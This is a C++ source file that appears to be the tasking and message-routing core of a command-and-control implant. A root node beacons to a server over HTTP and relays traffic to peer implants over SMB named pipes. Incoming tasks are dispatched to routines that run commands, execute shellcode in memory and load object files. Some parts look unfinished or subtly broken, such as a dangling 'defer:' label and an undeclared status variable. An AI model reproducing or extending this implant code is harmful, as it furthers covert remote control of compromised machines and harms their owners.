#include <core/include/dispatch.hpp>
namespace Dispatcher {

    DWORD PeekPeerId(const _stream *const stream) {

        uint32_t pid = 0;
        x_memcpy(&pid, B_PTR(stream->buffer), 4);

        return pid;
    }

    VOID AddMessage(_stream *const out) {

        auto head = Ctx->transport.outbound_queue;

        if (!Ctx->transport.outbound_queue) {
            Ctx->transport.outbound_queue = out;
        }
        else {
            while (head->next) {
                head = head->next;
            }

            head->next = out;
        }
    }

    VOID RemoveMessage(const _stream *target) {

        _stream *prev = { };

        if (!Ctx->transport.outbound_queue || !target) {
            return;
        }

        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
            if (head == target) {
                if (prev) {
                    prev->next = head->next;
                }
                else {
                    Ctx->transport.outbound_queue = head->next;
                }

                Stream::DestroyStream(head);
                return;

            }

            prev = head;
        }
    }

    VOID MessageQueue(_stream *const msg) {

        _parser parser = { };
        _stream *queue = { };

        if (msg->length > MESSAGE_MAX) {
            QueueSegments(B_PTR(msg->buffer), msg->length);
        }
        else {
            Parser::CreateParser(&parser, B_PTR(msg->buffer), msg->length);

            queue            = Stream::CreateStream();
            queue->peer_id   = __builtin_bswap32(Parser::UnpackDword(&parser));
            queue->task_id   = __builtin_bswap32(Parser::UnpackDword(&parser));
            queue->msg_type  = __builtin_bswap32(Parser::UnpackDword(&parser));

            queue->length   = parser.Length;
            queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));

            x_memcpy(queue->buffer, parser.buffer, queue->length);
            AddMessage(queue);

            Parser::DestroyParser(&parser);
            Stream::DestroyStream(msg);
        }
    }

    VOID QueueSegments(uint8_t *const buffer, uint32_t length) {

        _stream *queue      = { };
        uint32_t offset     = 0;
        uint32_t peer_id    = 0;
        uint32_t task_id    = 0;
        uint32_t cb_seg     = 0;
        uint32_t index      = 1;

        const auto n_seg        = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
        constexpr auto m_max    = MESSAGE_MAX - SEGMENT_HEADER_SIZE;

        while (length > 0) {
            cb_seg  = length > m_max ? m_max : length;
            queue   = (_stream*) x_malloc(cb_seg + SEGMENT_HEADER_SIZE);

            x_memcpy(&peer_id, buffer, 4);
            x_memcpy(&task_id, buffer + 4, 4);

            queue->peer_id    = peer_id;
            queue->task_id    = task_id;
            queue->msg_type   = TypeSegment;

            Stream::PackDword(queue, index);
            Stream::PackDword(queue, n_seg);
            Stream::PackDword(queue, cb_seg);
            Stream::PackBytes(queue, B_PTR(buffer) + offset, cb_seg);

            length -= cb_seg;
            offset += cb_seg;
            index++;

            AddMessage(queue);
        }
    }

    VOID PrepareEgress(_stream *out) {

        _parser parser = { };

        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
            // todo: prepend outbound messages with 0, inbound with 1

            if (head->buffer) {
                if (B_PTR(head->buffer)[0] == INGRESS) {
                    continue;
                }

                Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
                Stream::PackDword(out, head->peer_id);
                Stream::PackDword(out, head->task_id);
                Stream::PackDword(out, head->msg_type);

                if (ROOT_NODE) {
                    Stream::PackBytes(out, B_PTR(head->buffer), head->length);
                }
                else {
                    Utils::AppendBuffer(&out->buffer, head->buffer, (uint32_t*) &out->length, head->length);
                }
                break;
            }
        }

        Parser::DestroyParser(&parser);
    }

    VOID PrepareIngress(_stream *in) {

        if (in) {
            if (PeekPeerId(in) != Ctx->session.peer_id) {
                MessageQueue(in);
            }
            else {
                CommandDispatch(in);
            }
        }
        else {
            auto head = Ctx->transport.outbound_queue;

            while (head) {
                head->ready = FALSE;
                head = head->next;
            }
        }
    }

    VOID DispatchRoutine() {

        _stream *out    = Stream::CreateStream();
        _stream *in     = { };

        retry:

        if (!Ctx->transport.outbound_queue) {
            if (ROOT_NODE) {
                MessageQueue(Stream::CreateStreamWithHeaders(TypeTasking));
                goto retry;
            }
            else {
                ntstatus = ERROR_SUCCESS;
                return;
            }
        }

        PrepareEgress(out);

        if (ROOT_NODE) {
            Network::Http::HttpCallback(out, &in);
        }
        else {
            x_assert(Network::Smb::PipeSend(out));
            x_assert(Network::Smb::PipeReceive(&in));
        }

        Stream::DestroyStream(out);
        PrepareIngress(in);
        Clients::PushClients();

        defer:
    }

    VOID CommandDispatch (const _stream *const in) {

        _parser parser = { };

        Parser::CreateParser(&parser, B_PTR(in->buffer), in->length);
        Parser::UnpackDword(&parser);

        auto task_id = Parser::UnpackDword(&parser);
        x_memcpy(&Ctx->session.current_taskid, &task_id, sizeof(uint32_t));

        switch (Parser::UnpackDword(&parser)) {
            case TypeCheckin:   x_memset(&Ctx->session.checkin, true, sizeof(bool)); break;
            case TypeTasking:   Memory::Execute::ExecuteCommand(parser); break;
            case TypeExecute:   Memory::Execute::ExecuteShellcode(parser); break;
            case TypeObject:    Memory::Execute::LoadObject(parser); break;

            default:
                break;
        }

        Parser::DestroyParser(&parser);
    }
}
